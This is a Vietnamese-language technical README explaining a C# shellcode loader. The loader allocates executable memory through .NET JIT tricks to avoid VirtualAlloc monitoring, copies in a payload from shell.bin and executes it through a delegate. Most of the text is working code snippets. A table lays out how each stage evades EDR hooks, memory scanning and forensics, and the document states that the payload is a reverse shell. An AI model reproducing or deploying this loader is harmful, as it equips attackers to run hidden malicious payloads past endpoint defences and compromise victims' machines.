# Shellcode Loader - Kỹ thuật & Giải thích

Document này giải thích chi tiết các kỹ thuật được sử dụng trong `Program.cs` để load và execute shellcode từ file `.bin`.

---

## 1. Tổng quan luồng thực thi

```
Main()
  └── UevAppClass.Execute()
        ├── Load file "shell.bin"
        ├── GenerateRWXMemory()     ← Tạo vùng nhớ RWX
        ├── MeasureBuffer()         ← Đo kích thước thực
        ├── Realloc()               ← Mở rộng nếu thiếu
        ├── CopyMemory()            ← Copy shellcode vào RWX
        ├── Marshal.GetDelegate...  ← Tạo delegate từ raw pointer
        └── shellcodeDelegate()     ← Execute!
```

---

## 2. `GenerateRWXMemory(int ByteCount)` — Dynamic Assembly + JIT Bypass

### Mục đích
Tạo một vùng nhớ có thuộc tính `PAGE_EXECUTE_READWRITE` (RWX) **mà không cần gọi trực tiếp** `VirtualAlloc`, tránh bị các endpoint security detect qua API monitoring.

### Kỹ thuật: JIT Bypass / RWX Generation via DynamicMethod

**Bước 1:** Tạo dynamic assembly (in-memory only, không write ra disk):

```csharp
AssemblyName name = new AssemblyName("Assembly");
AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(
    name, AssemblyBuilderAccess.Run);
ModuleBuilder moduleBuilder = assemblyBuilder.DefineDynamicModule("Module", true);
```

**Bước 2:** Định nghĩa một global method ( JIT sẽ compile method này):

```csharp
MethodBuilder methodBuilder = moduleBuilder.DefineGlobalMethod(
    "MethodName",
    MethodAttributes.FamANDAssem | MethodAttributes.Family | MethodAttributes.Static,
    typeof(void),
    new Type[0]);
```

**Bước 3:** Emit IL bytecode vào method. Cốt truyện: JIT chỉ compile đến `ret` instruction cuối cùng — phần bộ nhớ sau `ret` trong page cũng nằm trong cùng allocation. Mỗi `EmitWriteLine` emit khoảng 18-30 bytes native code (call + prologue cho `Console.WriteLine`).

```csharp
ILGenerator il = methodBuilder.GetILGenerator();
while (ByteCount > 0)
{
    StringBuilder sb = new StringBuilder();
    for (int i = 0; i < 4; i++)
        sb.Append((char)('A' + random.Next(26)));
    il.EmitWriteLine(sb.ToString());  // ~18-30 bytes native mỗi lần
    ByteCount -= 18;
}
il.Emit(OpCodes.Ret);
```

**Bước 4:** Force JIT compile method và lấy raw function pointer:

```csharp
moduleBuilder.CreateGlobalFunctions();
RuntimeMethodHandle methodHandle = moduleBuilder.GetMethods()[0].MethodHandle;
RuntimeHelpers.PrepareMethod(methodHandle);  // JIT compile ngay
return methodHandle.GetFunctionPointer();      // Trả về con trỏ RWX
```

### Tại sao cần `EmitWriteLine` loop?

`DefineGlobalMethod` + `CreateGlobalFunctions` chỉ tạo một stub nhỏ. Để page đủ lớn chứa shellcode (46592 bytes), cần emit đủ IL sao cho JIT allocate đủ page size. Mỗi `EmitWriteLine` emit 18-30 bytes native, ta cần ~2589 lần gọi để có đủ buffer.

### Tại sao bypass được?

| Phương pháp | Bị detect bởi |
|---|---|
| `VirtualAlloc` trực tiếp | EDR (Sysmon Event ID 10) |
| `CreateRemoteThread` | EDR (Thread creation hook) |
| `DynamicMethod + GetFunctionPointer` | Không trigger `VirtualAlloc` API log |

---

## 3. `MeasureBuffer(IntPtr mem)` — Đo kích thước thực của RWX buffer

### Vấn đề
`GenerateRWXMemory` ước lượng buffer qua `EmitWriteLine` × 18 bytes, nhưng con số thực tế phụ thuộc vào:
- .NET version (.NET Framework 4.7.2 emit ~18-30 bytes/lần)
- x86 vs x64 (x86 code size nhỏ hơn)
- JIT version cụ thể

Trên .NET Framework 4.7.2 x64, mỗi `EmitWriteLine` emit **~30-40 bytes** native → buffer thực tế có thể lớn hơn ước lượng. Trên x86, buffer có thể **nhỏ hơn**.

### Kỹ thuật: Byte Scanning

```csharp
for (int n = 0; n < 4096; n++)
{
    byte b = Marshal.ReadByte(mem, n);
    if (b == 0xC3)  // x86/x64 RET instruction
    {
        // Kiểm tra xem có phải padding bytes (0xCC = INT3)
        // 0xCC 0xCC 0xC3 → dừng trước padding
        // 0xCC 0xC3     → dừng trước padding
        // 0xC3         → điểm kết thúc thực
        return n + 1;
    }
}
```

**Logic:** Cuối mỗi method trong x86/x64 luôn là instruction `0xC3` (RET). Sau `ret` có thể là `0xCC` (INT3) padding do alignment. Ta scan tìm `0xC3`, trim padding `0xCC` phía sau, trả về kích thước thực.

---

## 4. `Realloc(IntPtr oldMem, int oldSize, int newSize)` — VirtualAlloc Wrapper

### Mục đích
Khi `MeasureBuffer` cho thấy buffer nhỏ hơn shellcode, cấp vùng nhớ mới đủ lớn và copy nội dung cũ sang.

### Kỹ thuật

```csharp
IntPtr newMem = VirtualAlloc(
    IntPtr.Zero,                           // Let OS choose address
    (IntPtr)newSize,                       // New size
    MEM_COMMIT | MEM_RESERVE,              // Commit + Reserve
    PAGE_EXECUTE_READWRITE);               // RWX permissions
RtlMoveMemory(newMem, oldMem, (IntPtr)oldSize);  // Copy existing content
```

- `MEM_COMMIT | MEM_RESERVE` = allocate physical pages + virtual range
- `PAGE_EXECUTE_READWRITE` = executable + writable (cần execute sau khi copy shellcode)
- Copy bằng `RtlMoveMemory` (kernel-mode copy, nhanh hơn `Marshal.Copy` cho large buffer)

---

## 5. `CopyMemory(byte[] source, IntPtr dest)` — Safe Shellcode Injection

### Vấn đề
Copy trực tiếp từ managed `byte[]` sang unmanaged pointer không an toàn:
- GC có thể move `byte[]` trong quá trình copy → corruption
- `Marshal.Copy` đôi khi không pinned → crash

### Kỹ thuật: Intermediate Pinned Buffer

```csharp
IntPtr src = Marshal.AllocHGlobal(source.Length);  // 1. Cấp unmanaged heap
try
{
    Marshal.Copy(source, 0, src, source.Length);  // 2. Copy managed → unmanaged
    RtlMoveMemory(dest, src, (IntPtr)source.Length); // 3. Memcpy unmanaged → RWX
}
finally
{
    Marshal.FreeHGlobal(src);                        // 4. Free intermediate
}
Array.Clear(source, 0, source.Length);               // 5. Zero-out managed array
```

**5 bước đảm bảo:**
1. Unmanaged heap (`AllocHGlobal`) không bị GC影响
2. `Marshal.Copy` synchronous, không race với GC
3. `RtlMoveMemory` (kernel32) = fast kernel-mode memcpy
4. Free ngay sau khi dùng xong
5. `Array.Clear` xóa dấu vết trong managed heap

### Tại sao dùng `RtlMoveMemory` thay vì `Marshal.Copy`?

`RtlMoveMemory` là thin wrapper cho `memcpy`, compile thành `rep movsb`/`rep movsq` (SIMD-optimized). `Marshal.Copy` có thêm overhead của managed/unmanaged boundary marshaling.

---

## 6. `RtlMoveMemory` P/Invoke Signature — Common Bug Fix

### Bug phổ biến

```csharp
// SAI - gây FatalExecutionEngineError trên x64
[DllImport("kernel32.dll")]
private static extern void RtlMoveMemory(IntPtr dest, IntPtr src, uint byteCount);

// ĐÚNG - size_t tương thích cả x86 (4 bytes) và x64 (8 bytes)
[DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
private static extern void RtlMoveMemory(IntPtr dest, IntPtr src, IntPtr byteCount);
```

**Nguyên nhân:** Tham số thứ 3 của `RtlMoveMemory` là `size_t`:
- x86: `size_t` = `uint` (4 bytes)
- x64: `size_t` = `IntPtr` (8 bytes)

Trên x64, truyền `uint` cho tham số `size_t` (8 bytes) → CLR phải zero-extend 4 bytes cao → **stack corruption** → `FatalExecutionEngineError` (0xC0000005).

---

## 7. Execute Shellcode — `Marshal.GetDelegateForFunctionPointer`

### Kỹ thuật

```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate void Callback();  // Signature phải khớp với shellcode entry point

Callback shellcodeDelegate = Marshal.GetDelegateForFunctionPointer<Callback>(mem);
shellcodeDelegate();              // Gọi như method C# thông thường
```

**Cơ chế:** `Marshal.GetDelegateForFunctionPointer` cast raw `IntPtr` thành strongly-typed delegate. Khi invoke, CLR không kiểm tra code tại địa chỉ đó — nó nhảy thẳng vào execute.

### Giới hạn

| Yêu cầu | Chi tiết |
|---|---|
| Entry point signature | Phải khớp với `delegate void Callback()` |
| Return convention | Shellcode phải `ret` đúng convention |
| Không tham số | Nếu shellcode cần tham số, cần delegate khác với đúng signature |

---

## 8. Tổng hợp anti-detection

| Stage | Kỹ thuật | Chống lại |
|---|---|---|
| Allocation | DynamicMethod + JIT | EDR API hooks (`VirtualAlloc`) |
| Copy | Intermediate pinned buffer | In-memory scanning của raw `byte[]` |
| Execute | `GetDelegateForFunctionPointer` | `CreateRemoteThread` / `NtCreateThreadEx` detection |
| Trace | `Array.Clear` | Memory forensics post-execution |
| Signature | `RtlMoveMemory` thay vì `Copy` | Generic memcpy detection |

---

## 9. Các lỗi thường gặp

### `FatalExecutionEngineError` (0xC0000005)
- **Nguyên nhân:** `RtlMoveMemory` signature sai (`uint` thay vì `IntPtr`)
- **Fix:** Dùng `IntPtr byteCount` cho tham số thứ 3

### Buffer quá nhỏ → shellcode bị cắt
- **Nguyên nhân:** Ước lượng `EmitWriteLine × 18` không chính xác
- **Fix:** `MeasureBuffer` + `Realloc` khi thiếu

### `Marshal.Copy` crash khi GC chạy
- **Nguyên nhân:** `byte[]` bị move trong quá trình copy dài
- **Fix:** Dùng `AllocHGlobal` intermediate buffer như trên

### Shellcode không return đúng
- **Nguyên nhân:** Shellcode là reverse shell (không bao giờ return)
- **Fix:** Đây là behavior bình thường, không phải bug
